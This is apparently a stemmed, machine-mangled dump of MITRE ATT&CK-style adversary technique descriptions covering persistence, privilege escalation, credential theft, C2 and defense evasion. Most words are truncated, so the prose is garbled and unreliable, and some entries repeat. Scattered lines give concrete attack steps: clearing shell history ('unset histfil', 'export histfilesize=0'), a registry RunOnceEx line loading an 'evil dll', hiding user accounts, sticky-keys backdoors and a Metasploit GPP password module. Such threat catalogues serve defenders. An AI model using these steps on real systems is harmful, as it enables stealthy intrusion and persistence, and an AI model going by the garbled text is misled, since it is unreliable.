advers ad login item execut upon us login gain persist esc privileg login item apply docu fold serv connect autom launch us log op login item appl login item ad via shar fil list serv man framework ad login item shar fil list login item set us script langu applescrib http wherea serv man framework us ap cal < cod > smloginitemsetenabled < /code > login item inst us serv man framework lev < cod > launchd < /code > vis system pref remov apply cre ad login item smloginitemsetenabled schroeder 2013 login item cre us shar fil list vis system pref hid apply launch execut launchserv launchd op apply docu url without us find launch serv appl develop us apply us login item config us environ launch common us serv apply email chat mus apply advers util applescrib http nat ap http cal cre login item spawn malicy execut elc run startup pri vert 10.5 maco advers ad login item us applescrib http send appl ev “ system ev ” process applescrib dict manip login item login item ae advers us command < cod > tel apply “ system ev ” mak login item end property /path/to/executable < /code > startup item eclect hex osx.dok analys 2019 ad list remov login item appl script command ad path malicy execut login item fil list loc < cod > ~/library/application support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm < /code > startup item eclect advers also us login item launch execut us control victim system remot mean gain privileg esc prompt us cred objs mac malw 2017 checkpoint dok objs netwir backdo 2019
stag cap
advers upload instal otherw set cap us target support op advers nee tak cap develop develop cap http obtain obtain cap http stag infrastruct control cap stag infrastruct prevy purchased/rent advers acquir infrastruct http otherw comprom comprom infrastruct http cap also stag web serv github pastebin platform-as-a-service paa off en us easy provid apply volex oc lot novemb 2020 drago heroku wat hol malwarebyt heroku skim netskop gcp redirect netskop cloud phish stag cap aid advers numb init access post-compromise behavy includ limit stag web resourc necess conduc drive-by comprom http us brows sit fireey cfr wat hol 2012 gallagh 2015 scanbox stag web resourc link target us spearph malwarebyt sil libr octob 2020 proofpoint ta407 septemb 2019 upload malw tool loc access victim network en ingr tool transf http volex oc lot novemb 2020 inst prevy acquir ssl/tls cert us encrypt command control traff ex asymmet cryptograph http web protocol http digicert instal ssl cert
link target
advers put plac resourc ref link us target advers rely upon us click malicy link ord divulg inform includ cred gain execut malicy link http link us spearph send email accompany soc engin text coax us act click cop past url brows pri phish inform spearph link http phish gain init access system spearph link http advers must set resourc link target spearph link typ resourc link target html pag includ client-side script javascrib http decid cont serv us advers clon legitim sit serv link target includ clon login pag legitim web serv org login pag effort harvest cred spearph link http malwarebyt sil libr octob 2020 proofpoint ta407 septemb 2019 advers also upload malw http link target point malw download/execution us advers purchas domain simil legitim domain ex homoglyph typosquat diff top-level domain etc acquisit infrastruct domain http help facilit malicy link http link short serv also employ advers also us fre pay account platform-as-a-service provid host link target tak adv wid trust domain provid avoid block netskop gcp redirect netskop cloud phish intez ap serv phish
multi-stage channel
advers cre multipl stag command control employ diff condit certain funct us multipl stag obfusc command control channel mak detect difficult remot access tool cal back first-stage command control serv instruct first stag autom cap collect bas host inform upd tool upload addit fil second remot access tool rat could upload point redirect host second-stage command control serv second stag lik ful feat allow advers interact system revers shel addit rat feat diff stag lik host sep overlap infrastruct load also backup first-stage callback fallback channel http cas origin first-stage commun path discov block
execut guardrail
advers us execut guardrail constrain execut act bas advers supply environ spec condit expect pres target guardrail ens payload execut intend target reduc col dam advers ’ campaign fireey kevin mand guardrail valu advers provid target system environ us guardrail includ spec network shar nam attach phys dev fil join act direct ad domain local/extern ip address fireey outlook dec 2019 guardrail us prev expos cap environ intend comprom op within us guardrail distinct typ virtualization/sandbox evas http us virtualization/sandbox evas http involv check know sandbox valu continu execut match us guardrail involv check expect target-specific valu continu execut match
cloud stor object discovery
advers enum object cloud stor infrastruct advers us inform autom discovery shap follow-on behavy includ request spec object cloud stor simil fil direct discovery http loc host ident avail stor serv i.e cloud infrastruct discovery http advers access contents/object stor cloud infrastruct cloud serv provid off ap allow us enum object stor within cloud stor exampl includ listobjectsv2 aw listobjectsv2 list blob az list blob
web cooky
advers forg web cooky us gain access web apply internet serv web apply serv host cloud saa environ on-premise serv oft us sess cooky auth auth us access advers gen cooky ord gain access web resourc diff ste web sess cooky http simil behavy cooky new forg advers rath ste interceiv legitim us common web apply standard docu cooky valu gen us provid tool interfac pas cooky gen web cooky oft requir secret valu password priv key http cryptograph see valu forg advers us web cooky access resourc web sess cooky http bypass multi-factor auth protect mech volex solarwind pas cooky unit 42 mac crypto cooky janu 2019
tok impersonation/theft
advers duply imperson anoth us tok esc privileg bypass access control advers cre new access tok duply ex tok us < cod > duplicatetok ex < /code > tok us < cod > impersonateloggedonus < /code > allow cal thread imperson log us sec context < cod > setthreadtok < /code > assign imperson tok thread advers spec ex process want assign new tok exampl us target us non-network logon sess system
exfilt cod reposit
advers exfilt dat cod reposit rath prim command control channel cod reposit oft access via ap ex http access ap oft http giv advers addit level protect exfilt cod reposit also provid sign amount cov advers popul serv already us host within network
port knock
advers us port knock hid op port us persist command control en port advers send sery attempt connect predefin sequ clos port sequ complet op port oft accompl host bas firewal could also impl custom softw techn observ dynam op list port wel in connect list serv diff system observ sign packet trig commun conduc diff method on mean origin impl cd00r hartrel cd00r 2002 us libpcap libr sniff packet quest anoth method lev raw socket en malw us port already op us program
web serv
advers reg web serv us target vary popul websit ex advers reg web-based serv abus lat stag advers lifecyc command control web serv http exfilt web serv http us common serv off googl twit mak easy advers hid expect nois util web serv advers mak difficult phys tie back op
ste apply access tok
advers ste apply access tok mean acquir cred access remot system resourc apply access tok us mak auth ap request behalf us serv common us way access resourc cloud container-based apply software-as-a-servic saa auth0 - alway us access tok sec ap sept 2019 oau on common impl framework issu tok us access system advers ste account ap tok cloud contain environ abl access dat perform act permit account lead privileg esc comprom environ kubernet environ process run insid contain commun kubernet ap serv us serv account tok contain comprom attack abl ste contain ’ tok thereby gain access kubernet ap command kubernet serv account tok theft also occ soc engin cas us act requir grant access apply desir access cloud-bas serv protect ap gain entry us oau 2.0 vary auth protocol exampl commonly-used sequ microsoft auth cod grant flow microsoft id platform protocol 2019 microsoft - oau cod auth flow - jun 2019 oau access tok en third-party apply interact resourc contain us dat way request apply without obtain us cred advers lev oau auth construct malicy apply design grant access resourc target us oau tok amnesty oau phish attack august 2019 trend micro pawn storm oau 2017 advers nee complet reg apply auth serv exampl microsoft id platform us az port vis studio id command-line interfac powershel rest ap cal microsoft - az ad ap reg - 2019 send spearph link http target us ent grant access apply oau access tok grant apply gain pot long-term access feat us account apply access tok http microsoft - az ad id tok - aug 2019 apply access tok funct within limit lifetim limit long advers util ste tok howev cas advers also ste apply refresh tok auth0 understand refresh tok allow obtain new access tok without prompt us
spearph attach
advers send spearph mess malicy attach elicit sensit inform us target spearph inform attempt trick target divulg inform frequ cred act inform spearph inform frequ involv soc engin techn pos sourc reason collect inform ex est account http comprom account http and/or send multipl seem urg mess form spearph electron del soc engin target spec individ company industry scenario advers attach fil spearph email us rely upon recipy pop inform return fil sopho attach github phishery text spearph email us try giv plaus reason fil filled-in request inform busy assocy advers also us inform prevy reconnaiss effort ex search op websites/domain http search victim-owned websit http craft persuas believ lur
addit cloud cred
advers ad adversary-controlled cred cloud account maintain persist access victim account inst within environ exampl advers ad cred serv princip apply addit ex legitim cred az ad microsoft solarwind custom guid blu cloud dea blu cloud dea video cred includ x509 key password microsoft solarwind custom guid sufficy permit vary way ad cred includ az port az command lin interfac az az powershel mod demyst az ad serv princip infrastructure-as-a-servic ia environ gain access cloud account http advers gen import ssh key us eith < cod > createkeypair < /code > < cod > importkeypair < /code > ap aw < cod > gcloud comput os-login ssh-keys ad < /code > command gcp gcp ssh key ad allow persist access inst within cloud environ without us comprom cloud account expel io evil aw expel behind scen advers also us < cod > createaccesskey < /code > ap aw < cod > gcloud iam service-accounts key cre < /code > command gcp ad access key account target account diff permit request account advers also abl esc privileg environ i.e cloud account http rhino sec lab aw privileg esc
us execut
advers rely upon spec act us ord gain execut us subject soc engin get execut malicy cod exampl op malicy docu fil link us act typ observ follow-on behavy form phish http us execut http frequ occ short init access occ phas intrud advers plac fil shar direct us desktop hop us click act also see short intern spearph http advers also deceiv us perform act en remot access softw http allow direct control system advers download execut malw us execut http exampl tech support scam facilit phish http vish vary form us interact advers us combin method spoof promot toll-free numb cal cent us direct victim malicy websit del execut payload contain malw remot access softw http telephon attack delivery
intern defac
advers defac system intern org attempt intimid mislead us thu discredit integr system tak form mod intern websit direct us system replac desktop wallpap novett blockbust disturb offend im us part intern defac http ord caus us discomfort press comply accompany mess sint intern defac system expos advers pres oft tak plac intrud goal accompl novett blockbust destruct malw
hid us
advers us hid us hid pres us account cre mod admin want hid us many us account giv system want hid admin man account us maco advers cre mod us hid manip plist fil fold attribut us attribut prev us show login screen system pref advers set userid 500 set key valu < cod > hide500users < /code > < cod > tru < /code > < cod > /library/preferences/com.apple.loginwindow < /code > plist fil cybereason osx pirrit every us userid assocy < cod > hide500users < /code > key valu set < cod > tru < /code > us userid 500 appear login screen system pref us command lin advers us < cod > dscl < /code > util cre hid us account set < cod > ishid < /code > attribut < cod > 1 < /code > advers also hid us ’ hom fold chang < cod > chflags < /code > hid appl support hid us account advers simil hid us account window advers set < cod > hklm\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlist < /code > reg key valu < cod > 0 < /code > spec us prev us list logon screen fireey smokedham jun 2021 us-cert ta18-074 linux system advers hid us account login screen also ref greet method advers us depend display man distribut cur us exampl ubuntu system us gnom display mang gdm account hid greet us < cod > gset < /code > command ex < cod > sudo -u gdm gset set org.gnome.login-screen disable-user-list tru < /code > hid gdm us account display man anch spec distribut chang us advers
mak imperson tok
advers mak imperson tok esc privileg bypass access control advers usernam password us log onto system advers cre logon sess us us < cod > logonus < /code > funct funct return cop new sess access tok advers us < cod > setthreadtok < /code > assign tok thread
group policy pref
advers attempt find unsec cred group policy pref gpp gpp tool allow admin cre domain policy emb cred policy allow admin set loc account microsoft gpp 2016 group policy stor sysvol domain control mean domain us view sysvol shar decrypt password us ae key mak publ microsoft gpp key follow tool script us gath decrypt password fil group policy pref xml fil metasploit ’ post exploit mod < cod > post/windows/gather/credentials/gpp < /code > get-gpppassword obscuresec get-gpppassword gpprefdecrypt.py sysvol shar advers us follow command enum pot gpp xml fil < cod > dir /s .xml < /code >
control panel item
window control panel item util allow us view adjust comput set control panel item reg execut .exe control panel .cpl fil lat act renam dynamic-link libr .dll fil export cplapplet funct microsoft impl cpl trendmicro cpl malw jan 2014 control panel item execut direct command lin program via apply program interfac ap cal simply double-clicking fil microsoft impl cpl trendmicro cpl malw jan 2014 trendmicro cpl malw dec 2013 eas us control panel item typ includ graph menu avail us reg load control panel microsoft impl cpl advers us control panel item execut payload execut arbit command malicy control panel item del via spearph attach http campaign trendmicro cpl malw jan 2014 trendmicro cpl malw dec 2013 execut part multi-stage malw palo alto reav nov 2017 control panel item spec cpl fil also bypass apply and/or fil extend whitel
exfilt asymmet encrypt non-c2 protocol
advers ste dat exfilt asymmet encrypt network protocol ex command control channel dat also send altern network loc main command control serv asymmet encrypt algorithm us diff key end channel also know public-key cryptograph requir pair cryptograph key encrypt/decrypt dat correspond key end commun channel requir priv key process ent publ key ent publ key ent exchang encrypt commun begin network protocol us asymmet encrypt https/tls/ssl oft util symmet encrypt key exchang advers opt us encrypt mech bak protocol
cloud account
advers attempt get list cloud account cloud account cre config org us us remot support serv admin resourc within cloud serv provid saa apply auth access sev tool us find account < cod > get-msolrolemember < /code > powershel cmdlet us obtain account nam giv rol permit group off 365 microsoft msolrolememb github raind az cli az cli also provid interfac obtain us account auth access domain command < cod > az ad us list < /code > list us within domain microsoft az cli black hil red team m ad az 2018 aw command < cod > aw iam list-users < /code > us obtain list us cur account < cod > aw iam list-roles < /code > obtain iam rol spec path prefix aw list rol aw list us gcp < cod > gcloud iam service-accounts list < /code > < cod > gcloud project get-iam-policy < /code > us obtain list serv account us project googl cloud - iam servy account list ap
process discovery
advers attempt get inform run process system inform obtain could us gain understand common software/applications run system within network advers us inform process discovery http autom discovery shap follow-on behavy includ wheth advers ful infect target and/or attempt spec act window environ advers could obtain detail run process us taskl http util via cmd http < cod > get-process < /code > via powershel http inform process also extract output nat ap http cal < cod > createtoolhelp32snapshot < /code > mac linux accompl < cod > p < /code > command advers also opt enum process via /proc
impair command hist log
advers impair command hist log hid command run comprom system vary command interpret keep track command us typ termin us retrac 've do linux maco command hist track fil point environ vary < cod > histfil < /code > us log system inform flush fil us hom direct cal < cod > ~/.bash_history < /code > < cod > histcontrol < /code > environ vary keep track sav < cod > hist < /code > command ev < cod > ~/.bash_history < /code > fil us log < cod > histcontrol < /code > ex default maco set us respect advers clear hist environ vary < cod > unset histfil < /code > set command hist siz zero < cod > export histfilesize=0 < /code > prev log command addit < cod > histcontrol < /code > config ign command start spac simply set ignorespac < cod > histcontrol < /code > also set ign duply command set ignoredup linux system set default ignorebo cov prevy exampl mean “ l ” sav “ l ” would sav hist advers abus op without leav trac simply prepend spac termin command window system < cod > psreadline < /code > mod track command us powershel sess writ fil < cod > env appdata\microsoft\windows\powershell\psreadline\consolehost_history.txt < /code > default advers chang log sav us < cod > set-psreadlineoption -historysavepath fil path < /code > caus < cod > consolehost_history.txt < /code > stop receiv log addit poss turn log fil us powershel command < cod > set-psreadlineoption -historysavestyle savenoth < /code > microsoft powershel command hist sopho powershel command audit sopho powershel command hist forens advers also lev network dev cli http network dev dis hist command log e.g < cod > log < /code >
launchd
techn deprec due inacc us report cit provid techn detail malw interact direct launchd rath go know serv system serv us interact launchd rath launchd us advers abus < cod > launchd < /code > daemon perform task schedule init rec execut malicy cod < cod > launchd < /code > daemon nat maco respons load maintain serv within op system process load paramet launch-on-demand system-level daemon property list plist fil find < cod > /system/library/launchdaemons < /code > < cod > /library/launchdaemons < /code > appledoc launch ag daemon launchdaemon property list fil point execut launch method mac malw persist advers us < cod > launchd < /code > daemon maco environ schedule new execut run system startup schedule bas persist < cod > launchd < /code > also abus run process context spec account daemon < cod > launchd < /code > run permit root us account op regardless us account log
window man instru ev subscrib
advers est persist elev privileg execut malicy cont trig window man instru wmi ev subscrib wmi us instal ev filt provid consum bind execut cod defin ev occ exampl ev subscrib wal clock tim us log comput uptim mandy m-trends 2015 advers us cap wmi subscrib ev execut arbit cod ev occ provid persist system fireey wmi san 2015 fireey wmi 2015 advers also compil wmi script window man object mof fil .mof extend us cre malicy subscrib del wmi persist microsoft mof 2018 wmi subscrib execut proxy wmi provid host process wmiprvse.ex thu result elev system privileg
cdns
advers search cont delivery network cdn dat victim us target cdns allow org host cont distribut load bal array serv cdns also allow org custom cont delivery bas request ’ geograph reg advers search cdn dat gath act inform threat act us onlin resourc lookup tool harvest inform cont serv within cdn advers also seek target cdn misconfig leak sensit inform intend host and/or protect mech ex login port cont host org ’ websit digitalshadow cdn inform sourc rev opportun form reconnaiss ex act scan http search op websites/domain http est op resourc ex acquir infrastruct http comprom infrastruct http and/or init access ex drive-by comprom http
us act bas check
advers employ vary us act check detect avoid virt analys environ includ chang behavy bas result check pres artifact ind virt machin environ vme sandbox advers detect vme alt malw diseng victim cont cor funct impl also search vme artifact drop second addit payload advers us inform learn virtualization/sandbox evas http autom discovery shap follow-on behavy deloit environ aw advers search us act host bas vary speed/frequency mous mov click san virt jan 2016 brows hist cach bookmark numb fil common direct hom desktop method rely spec us interact system malicy cod act wait docu clos act macro unit 42 sof nov 2018 wait us doubl click emb im act fireey fin7 april 2017
input prompt
program execut nee addit privileg pres cur us context common op system prompt us prop cred auth elev privileg task ex bypass us account control http advers mim funct prompt us cred seem legitim prompt numb reason mim norm us fak instal requir addit access fak malw remov suit osx malw exploit mackeep typ prompt us collect cred via vary langu applescrib http logrhythm trust oct 2014 osx keydnap malw powershel http logrhythm trust oct 2014 enigm phish cred jan 2015
cloud account
advers cre account cloud provid us target advers us cloud account op includ lev cloud stor serv dropbox meg microsoft onedr aw s3 bucket exfilt cloud stor http upload tool http s. cloud account also us acquisit infrastruct virt priv serv http serverless http infrastruct est cloud account allow advers develop soph cap without man serv awak sec c2 cloud cre cloud account http also requir advers est email account http reg cloud provid
softw deploy tool
advers gain access us third-party softw suit inst within enterpr network admin monit deploy system mov lat network third-party apply softw deploy system us network environ admin purpos sccm hb altir etc. access third-party network-wide enterprise-wid softw system en advers remot cod execut system connect system access us lat mov system gath inform caus spec effect wip hard driv endpoint permit requir act vary system config loc cred sufficy direct access third-party system spec domain cred requir howev system requir admin account log perform intend purpos
exfilt c2 channel
advers ste dat exfilt ex command control channel ste dat encod norm commun channel us protocol command control commun
par pid spoof
advers spoof par process ident ppid new process evad process-monitoring defens elev privileg new process typ spawn direct par cal process unless explicit spec on way explicit assign ppid new process via < cod > createprocess < /code > ap cal support paramet defin ppid us didierstev selectmyp nov 2009 funct us window feat us account control uac correct set ppid request elev process spawn system typ via < cod > svchost.exe < /code > < cod > consent.exe < /code > rath cur us context microsoft uac nov 2018 advers abus mech evad defens block process spawn direct off docu analys target unusual/potentially malicy parent-child process rel spoof ppid powershel http / rundll32 http < cod > explorer.exe < /code > rath off docu del part spearph attach http counterceiv ppid spoof dec 2018 spoof could execut via vis bas http within malicy off docu cod perform nat ap http ctd ppid spoof macro mar 2019 counterceiv ppid spoof dec 2018 explicit assign ppid also en elev privileg giv appropry access right par process exampl advers privileg us context i.e admin spawn new process assign par process run system < cod > lsass.exe < /code > caus new process elev via inherit access tok xpnsec ppid nov 2017
gath victim org inform
advers gath inform victim org us target inform org includ vary detail includ nam divisions/department spec busy op wel rol respons key employ advers gath inform vary way direct elicit via phish inform http inform org also expos advers via onlin access dat set ex soc med http search victim-owned websit http threatpost broadvo leak sec edg search gath inform rev opportun form reconnaiss ex phish inform http search op websites/domain http est op resourc ex est account http comprom account http and/or init access ex phish http trust rel http
reg run key / startup fold
advers achiev persist ad program startup fold ref reg run key ad entry run key reg startup fold caus program ref execut us log microsoft run key program execut context us account assocy permit level plac program within startup fold caus program execut us log startup fold loc individ us account wel system-wide startup fold check regardless us account log startup fold path cur us < cod > c \users\ usernam \appdata\roaming\microsoft\windows\start menu\programs\startup < /code > startup fold path us < cod > c \programdata\microsoft\windows\start menu\programs\startup < /code > follow run key cre default window system < cod > hkey_current_user\software\microsoft\windows\currentversion\run < /code > < cod > hkey_current_user\software\microsoft\windows\currentversion\runonce < /code > < cod > hkey_local_machine\software\microsoft\windows\currentversion\run < /code > < cod > hkey_local_machine\software\microsoft\windows\currentversion\runonce < /code > < cod > hkey_local_machine\software\microsoft\windows\currentversion\runonceex < /code > also avail cre default window vist new reg run key entry ref program direct list depend microsoft runonceex apr 2018 exampl poss load dll logon us depend key runonceex < cod > reg ad hklm\software\microsoft\windows\currentversion\runonceex\0001\depend /v 1 /d c \temp\evil dll < /code > oddv moe runonceex mar 2018 follow reg key us set startup fold item persist < cod > hkey_current_user\software\microsoft\windows\currentversion\explorer\user shel fold < /code > < cod > hkey_current_user\software\microsoft\windows\currentversion\explorer\shell fold < /code > < cod > hkey_local_machine\software\microsoft\windows\currentversion\explorer\shell fold < /code > < cod > hkey_local_machine\software\microsoft\windows\currentversion\explorer\user shel fold < /code > follow reg key control autom startup serv boot < cod > hkey_local_machine\software\microsoft\windows\currentversion\runservicesonce < /code > < cod > hkey_current_user\software\microsoft\windows\currentversion\runservicesonce < /code > < cod > hkey_local_machine\software\microsoft\windows\currentversion\runservices < /code > < cod > hkey_current_user\software\microsoft\windows\currentversion\runservices < /code > us policy set spec startup program cre correspond valu eith two reg key < cod > hkey_local_machine\software\microsoft\windows\currentversion\policies\explorer\run < /code > < cod > hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\run < /code > winlogon key control act occ us log comput run window 7. act control op system also ad custom act < cod > hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon\userinit < /code > < cod > hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon\shell < /code > subkey autom launch program program list load valu reg key < cod > hkey_current_user\software\microsoft\windows nt\currentversion\windows < /code > run us log default mult bootexecut valu reg key < cod > hkey_local_machine\system\currentcontrolset\control\session man < /code > set autocheck autochk valu caus window startup check file-system integr hard disk system shut abnorm advers ad program process reg valu autom launch boot advers us config loc execut malw remot access tool maintain persist system reboot advers also us masquerad http mak reg entry look assocy legitim program
forg web cred
advers forg cred mat us gain access web apply internet serv web apply serv host cloud saa environ on-premise serv oft us sess cooky tok mat auth auth us access advers gen cred mat ord gain access web resourc diff ste web sess cooky http ste apply access tok http simil behavy cred new forg advers rath ste interceiv legitim us gen web cred oft requir secret valu password priv key http cryptograph see valu github aws-adfs-credential-generator forg advers us web cred access resourc ex us altern auth mat http bypass multi-factor auth protect mech pas cooky unit 42 mac crypto cooky janu 2019 microsoft solarwind custom guid
multi-factor auth request gen
advers attempt bypass multi-factor auth mfa mech gain access account gen mfa request send us advers possess cred valid account http un complet login process lack access 2fa mfa mech requir addit cred sec control circumv advers abus autom gen push not mfa serv duo push microsoft auth okt simil serv us grant access account cas advers continu rep login attempt ord bombard us mfa push not sm mess phon cal pot result us fin acceiv auth request respons “ mfa fatigue. ” russ 2fa push annoy - cimpanu mfa fatigu attack - portswig suspect russ act target govern busy ent around glob
comprom cli softw bin
advers mod cli softw bin est persist access system cli softw en us access serv provid serv common cli softw typ ssh cli ftp cli email cli web brows advers mak mod cli softw bin carry malicy task apply us exampl advers cop sourc cod cli softw ad backdo compil target replac legitim apply bin support fil backdo on sint apply routin execut us advers lev persist access host
powershel
advers abus powershel command script execut powershel pow interact command-line interfac script environ includ window op system technet powershel advers us powershel perform numb act includ discovery inform execut cod exampl includ < cod > start-process < /code > cmdlet us run execut < cod > invoke-command < /code > cmdlet run command loc remot comput though admin permit requir us powershel connect remot system powershel also us download run execut internet execut disk mem without touch disk numb powershell-based offend test tool avail includ empir http powersploit http poshc2 http psattack github psattack powershel commands/script also execut without direct invok < cod > powershell.exe < /code > bin interfac powershel und < cod > system.management.automation < /code > assembl dll expos .net framework window common langu interfac cli sixdub powerpick jan 2016 silentbreak offend p dec 2015 microsoft psfromcsharp apr 2014
shortcut mod
shortcut symbol link way ref fil program op execut shortcut click execut system startup process advers could us shortcut execut tool persist cre new shortcut mean indirect us masquerad http look lik legitim program advers could also edit target path entir replac ex shortcut tool execut instead intend legitim program
chang default fil assocy
advers est persist execut malicy cont trig fil typ assocy fil op default program us op fil also cal fil assocy handl check fil assocy select stor window reg edit us admin program reg access admin us built-in assoc util microsoft chang default program microsoft fil handl microsoft assoc oct 2017 apply mod fil assocy giv fil extend cal arbit program fil giv extend op system fil assocy list < cod > hkey_classes_root\ extend < /code > exampl < cod > hkey_classes_root\.txt < /code > entry point handl extend loc < cod > hkey_classes_root\\ handl < /code > vary command list subkey undernea shel key < cod > hkey_classes_root\\ handl \shell\\ act \command < /code > exampl < cod > hkey_classes_root\txtfile\shell\open\command < /code > < cod > hkey_classes_root\txtfile\shell\print\command < /code > < cod > hkey_classes_root\txtfile\shell\printto\command < /code > valu key list command execut handl op fil extend advers mod valu contin execut arbit command trendmicro troj-fakeav oct 2012
vdso hijack
advers inject malicy cod process via vdso hijack ord evad process-based defens wel poss elev privileg virt dynam shar object vdso hijack method execut arbit cod address spac sep liv process vdso hijack involv redirect cal dynam link shar libr mem protect prev writ execut cod process via ptrace system cal http howev advers hijack syscal interfac cod stub map process vdso shar object execut syscal op map malicy shar object cod invok redirect execut flow process via patch mem address ref stor process ' glob offset tabl stor absolv address map libr funct elf inject 2009 backtrac vdso vdso aug 2005 syscal 2014 run cod context anoth process allow access process mem system/network resourc poss elev privileg execut via vdso hijack also evad detect sec produc sint execut mask legitim process
multiband commun
techn deprec long us advers split commun diff protocol could on protocol inbound command control anoth outbound dat allow bypass certain firewal restrict split could also random simply avoid dat threshold alert on commun
fil transf protocol
advers commun us apply lay protocol assocy transf fil avoid detection/network filt blend ex traff command remot system oft result command emb within protocol traff cli serv protocol ftp ftp tftp transf fil common environ packet produc protocol many field head dat cont dat could also cont within transf fil advers abus protocol commun system control within victim network also mim norm expect traff
compon object model hijack
compon object model com system within window en interact softw compon op system microsoft compon object model advers us system insert malicy cod execut plac legitim softw hijack com ref rel mean persist hijack com object requir chang window reg replac ref legitim system compon caus compon work execut system compon execut norm system op advers cod execut instead gdat com hijack advers lik hijack object us frequ enough maintain consist level persist unlik break not funct within system avoid system inst could lead detect
access feat
window contain access feat launch key combin us log exampl us window logon screen advers mod way program launch get command prompt backdo without log system two common access program < cod > c \windows\system32\sethc.exe < /code > launch shift key press fiv tim < cod > c \windows\system32\utilman.exe < /code > launch window + u key combin press sethc.exe program oft ref sticky key us advers unauth access remot desktop login screen fireey hikit rootkit depend vert window advers tak adv feat diff way cod integr enh new vert window replac bin nee digit sign x64 system bin must resid < cod > systemdir \ < /code > must protect window fil resourc protect wfp/wrp defcon2016 sticky key debug method lik discov pot workaround requir correspond access feat bin replac exampl method simpl bin replac window xp lat wel window serv 2003/r2 lat exampl program < cod > c \windows\system32\utilman.exe < /code > replac cmd.exe anoth program provid backdo access subsequ press appropry key combin login screen sit keyboard connect remot desktop protocol http caus replac fil execut system privileg tilbury 2014 debug method window vist lat wel window serv 2008 lat exampl reg key mod config cmd.exe anoth program provid backdo access debug access program utilman.exe reg mod press appropry key combin login screen keyboard connect rdp caus debug program execut system privileg tilbury 2014 access feat ex also lev simil fash defcon2016 sticky key on-screen keyboard < cod > c \windows\system32\osk.exe < /code > magn < cod > c \windows\system32\magnify.exe < /code > nar < cod > c \windows\system32\narrator.exe < /code > display switch < cod > c \windows\system32\displayswitch.exe < /code > ap switch < cod > c \windows\system32\atbroker.exe < /code >
exploit cred access
advers exploit softw vuln attempt collect cred exploit softw vuln occ advers tak adv program er program serv within op system softw kernel execut adversary-controlled cod cred auth mech target exploit advers mean gain access us cred circumv process gain access system on exampl ms14-068 target kerbero us forg kerbero ticket us domain us permit technet ms14-068 adsec detect forg ticket exploit cred access also result privileg esc depend process target cred obtain
emond
advers gain persist elev privileg execut malicy cont trig ev monit daemon emond emond launch daemon http acceiv ev vary serv run simpl rul engin tak act emond bin < cod > /sbin/emond < /code > load rul < cod > /etc/emond.d/rules/ < /code > direct tak act explicit defin ev tak plac rul fil plist form defin nam ev typ act tak exampl ev typ includ system startup us auth exampl act run system command send email emond serv launch fil pres queuedirect path < cod > /private/var/db/emondclients < /code > spec launch daemon http config fil < cod > /system/library/launchdaemons/com.apple.emond.plist < /code > xorry emond jan 2018 magnusvir emond apr 2016 sentinelon maco persist jun 2019 advers abus serv writ rul execut command defin ev occ system start us auth xorry emond jan 2018 magnusvir emond apr 2016 sentinelon maco persist jun 2019 advers also abl esc privileg admin root emond serv execut root privileg launch daemon http serv
one-way commun
advers us ex legitim extern web serv mean send command comprom system without receiv return output web serv channel comprom system lev popul websit soc med host command control c2 instruct infect system opt send output command back diff c2 channel includ anoth distinct web serv altern comprom system return output cas advers want send instruct system want respons popul websit soc med act mech c2 giv sign amount cov due lik host within network already commun pri comprom us common serv off googl twit mak easy advers hid expect nois web serv provid common us ssl/tls encrypt giv advers ad level protect
gath victim network inform
advers gath inform victim network us target inform network includ vary detail includ admin dat ex ip rang domain nam etc wel spec regard topolog op advers gath inform vary way direct collect act via act scan http phish inform http inform network also expos advers via onlin access dat set ex search op techn databas http who dns dumpst circ pass dns gath inform rev opportun form reconnaiss ex act scan http search op websites/domain http est op resourc ex acquir infrastruct http comprom infrastruct http and/or init access ex trust rel http
exploit remot serv
advers exploit remot serv gain unauth access intern system insid network exploit softw vuln occ advers tak adv program er program serv within op system softw kernel execut adversary-controlled cod common goal post-compromise exploit remot serv lat mov en access remot system advers nee determin remot system vuln stat do network serv discovery http discovery method look common vuln softw deploy network lack certain patch ind vuln sec softw us detect contain remot exploit serv lik high valu target lat mov exploit endpoint system also risk provid adv access addit resourc sev well-known vuln ex common serv smb ci multipl smb vuln rdp nvd cve-2017-0176 wel apply us within intern network mysql nvd cve-2016-6662 web serv serv nvd cve-2014-7169 depend permit level vuln remot serv advers achiev exploit privileg esc http result lat mov exploit wel
par pid spoof
advers spoof par process ident ppid new process evad process-monitoring defens elev privileg new process typ spawn direct par cal process unless explicit spec on way explicit assign ppid new process via < cod > createprocess < /code > ap cal support paramet defin ppid us didierstev selectmyp nov 2009 funct us window feat us account control uac correct set ppid request elev process spawn system typ via < cod > svchost.exe < /code > < cod > consent.exe < /code > rath cur us context microsoft uac nov 2018 advers abus mech evad defens block process spawn direct off docu analys target unusual/potentially malicy parent-child process rel spoof ppid powershel http / rundll32 http < cod > explorer.exe < /code > rath off docu del part spearph attach http counterceiv ppid spoof dec 2018 spoof could execut via vba script http within malicy off docu cod perform nat ap http ctd ppid spoof macro mar 2019 counterceiv ppid spoof dec 2018 explicit assign ppid also en privileg esc http giv appropry access right par process exampl advers privileg us context i.e admin spawn new process assign par process run system < cod > lsass.exe < /code > caus new process elev via inherit access tok xpnsec ppid nov 2017
keychain
keychain built-in way maco keep track us ' password cred many serv feat wif password websit sec not cert kerbero keychain fil loc < cod > ~/library/keychains/ < /code > < cod > /library/keychains/ < /code > < cod > /network/library/keychains/ < /code > wikiped keychain < cod > sec < /code > command-line util build maco default provid us way man cred man cred us us addit cred access keychain advers know cred login keychain get access cred stor vault extern da o x way default passphras keychain us ’ logon cred
intern spearph
advers us intern spearph gain access addit inform exploit us within org already access account system within environ intern spearph multi-staged campaign email account own eith control us dev prevy inst malw comprom account cred us advers attempt tak adv trust intern account increas lik trick target fal phish attempt trend micro phish start insid 2017 advers lev spearph attach http spearph link http part intern spearph del payload redirect extern sit capt cred input capt http sit mim email login interfac not incid intern spearph us ey pyramid campaign us phish email malicy attach lat mov victim comprom near 18,000 email account process trend micro phish start insid 2017 syr electron army sea comprom email account fin tim ft ste addit account cred ft learn campaign begin warn employ threat sea send phish email mim fin tim depart abl comprom ev us fin tim ltd 2019
sudo
sudo fil < cod > /etc/sudoers < /code > describ us run command termin also describ command us run us group provid ide least privileg us run lowest poss permit tim elev us permit nee typ prompt password howev sudo fil also spec prompt us password lin lik < cod > user1 all= nopasswd < /code > osx.dok malw advers tak adv config execut command us spawn process high privileg must elev privileg edit fil though
serv fil permit weak
